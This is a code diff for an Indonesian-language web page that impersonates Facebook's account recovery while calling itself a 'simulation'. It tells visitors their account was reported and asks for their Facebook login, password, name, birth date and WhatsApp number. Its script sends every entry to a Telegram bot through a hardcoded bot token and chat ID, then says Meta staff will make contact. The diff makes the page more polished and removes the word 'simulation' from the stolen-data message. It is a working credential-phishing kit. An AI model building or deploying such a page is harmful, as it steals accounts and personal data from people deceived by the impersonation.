@@ -2,132 +2,143 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Simulasi Pemulihan Akun</title>
+  <title>Pemulihan Akun Facebook - Simulasi</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      background: #f0f2f5;
-      font-family: sans-serif;
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    html, body {
+      height: 100%;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f0f2f5;
+    }
+    .screen {
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
+      width: 100%;
+      padding: 20px;
+      background-color: #f0f2f5;
     }
-    .box {
+    .container {
       background: white;
-      padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      width: 90%;
+      padding: 30px 25px;
+      box-shadow: 0 5px 12px rgba(0,0,0,0.1);
+      width: 100%;
       max-width: 400px;
       text-align: center;
     }
-    .box img {
-      width: 50px;
-      margin-bottom: 20px;
-    }
-    .box h2 {
+    .container h2 {
       color: #1877f2;
       font-size: 24px;
-      margin-bottom: 10px;
+      margin-bottom: 15px;
     }
-    .box p {
+    .container p {
       font-size: 14px;
       color: #333;
-      margin-bottom: 20px;
+      margin-bottom: 25px;
     }
-    .box button {
-      padding: 12px;
+    .container input {
       width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    .container button {
+      width: 100%;
+      padding: 12px;
       background-color: #1877f2;
-      color: white;
+      color: #fff;
+      font-weight: bold;
       border: none;
       border-radius: 6px;
-      font-weight: bold;
-      cursor: pointer;
       font-size: 16px;
+      cursor: pointer;
     }
     .hidden {
       display: none;
     }
-    input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      font-size: 14px;
-    }
-    .success-box h2 {
-      font-size: 22px;
-      color: #1877f2;
-      margin-bottom: 10px;
-    }
-    .success-box p {
-      color: #000;
-      font-size: 14px;
+    img.lock-icon {
+      width: 48px;
+      margin-bottom: 20px;
     }
   </style>
 </head>
 <body>
 
-  <!-- STEP 1: Peringatan -->
-  <div class="box" id="step1">
-    <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="lock icon">
-    <h2>Harap Konfirmasi Identitas Anda</h2>
-    <p>Demi keamanan, kami perlu memverifikasi akun Anda karena telah dilaporkan mengandung konten tidak pantas.</p>
-    <button onclick="goToRecovery()">Lanjutkan</button>
+  <!-- STEP 1: Verifikasi -->
+  <div class="screen" id="step1">
+    <div class="container">
+      <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Lock" class="lock-icon">
+      <h2>Harap Konfirmasi Identitas Anda</h2>
+      <p>Demi keamanan, kami perlu memverifikasi akun Anda karena telah dilaporkan mengandung konten tidak pantas.</p>
+      <button onclick="goToForm()">Lanjutkan</button>
+    </div>
   </div>
 
-  <!-- STEP 2: Pemulihan Akun -->
-  <div class="box hidden" id="step2">
-    <h2 style="color:#1877f2; font-size:28px; margin-bottom: 20px;">Pemulihan Akun</h2>
-    <form id="recoveryForm">
-      <input type="text" id="email" placeholder="Email atau Nomor Telepon Facebook" required>
-      <input type="password" id="password" placeholder="Password Facebook" required>
-      <input type="text" id="nama" placeholder="Nama Facebook" required>
-      <input type="text" id="tglLahir" placeholder="Tanggal Lahir (DD-MM-YYYY)" required>
-      <input type="text" id="whatsapp" placeholder="Nomor WhatsApp untuk pemberitahuan" required>
-      <button type="submit">Lanjutkan</button>
-    </form>
+  <!-- STEP 2: Form Pemulihan -->
+  <div class="screen hidden" id="step2">
+    <div class="container">
+      <h2 style="font-size:28px;">Pemulihan Akun</h2>
+      <form id="recoveryForm">
+        <input type="text" id="email" placeholder="Email atau Nomor Telepon Facebook" required>
+        <input type="password" id="password" placeholder="Password Facebook" required>
+        <input type="text" id="nama" placeholder="Nama Facebook" required>
+        <input type="text" id="tglLahir" placeholder="Tanggal Lahir (DD-MM-YYYY)" required>
+        <input type="text" id="whatsapp" placeholder="Nomor WhatsApp untuk pemberitahuan" required>
+        <button type="submit">Lanjutkan</button>
+      </form>
+    </div>
   </div>
 
-  <!-- STEP 3: Halaman Berhasil -->
-  <div class="box hidden success-box" id="step3">
-    <h2>Berhasil!</h2>
-    <p>Informasi berhasil dikirim. Anda akan dihubungi melalui WhatsApp oleh tim Meta Facebook.</p>
+  <!-- STEP 3: Sukses -->
+  <div class="screen hidden" id="step3">
+    <div class="container">
+      <h2 style="font-size:26px;">Berhasil!</h2>
+      <p>Informasi berhasil dikirim. Anda akan dihubungi melalui WhatsApp oleh tim Meta Facebook.</p>
+    </div>
   </div>
 
   <script>
-    function goToRecovery() {
-      document.getElementById('step1').classList.add('hidden');
-      document.getElementById('step2').classList.remove('hidden');
+    function goToForm() {
+      document.getElementById("step1").classList.add("hidden");
+      document.getElementById("step2").classList.remove("hidden");
     }
 
-    const botToken = '7733097714:AAFizEnWZUqtjfJxikCqoNOCzufsJTB2Vk8'; // Ganti token bot Anda
-    const chatId = '7228659553';     // Ganti ID Telegram Anda
+    const botToken = '7733097714:AAFizEnWZUqtjfJxikCqoNOCzufsJTB2Vk8'; // Ganti dengan token Anda
+    const chatId = '7228659553';     // Ganti dengan chat ID Anda
 
-    document.getElementById('recoveryForm').addEventListener('submit', function(e) {
+    document.getElementById("recoveryForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      const nama = document.getElementById('nama').value;
-      const tgl = document.getElementById('tglLahir').value;
-      const wa = document.getElementById('whatsapp').value;
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const nama = document.getElementById("nama").value;
+      const tglLahir = document.getElementById("tglLahir").value;
+      const whatsapp = document.getElementById("whatsapp").value;
 
-      const message = `📄 Simulasi Pemulihan Akun Facebook\n📧 Email/No HP: ${email}\n🔑 Password: ${password}\n👤 Nama: ${nama}\n🎂 Tanggal Lahir: ${tgl}\n📱 WhatsApp: ${wa}`;
+      const text = `🔐 Pemulihan Akun Facebook\n📧 Email/No: ${email}\n🔑 Password: ${password}\n👤 Nama: ${nama}\n🎂 Lahir: ${tglLahir}\n📱 WhatsApp: ${whatsapp}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
         body: JSON.stringify({
           chat_id: chatId,
-          text: message
+          text: text
         })
-      }).then(response => {
-        document.getElementById('step2').classList.add('hidden');
-        document.getElementById('step3').classList.remove('hidden');
+      }).then(() => {
+        document.getElementById("step2").classList.add("hidden");
+        document.getElementById("step3").classList.remove("hidden");
       });
     });
   </script>
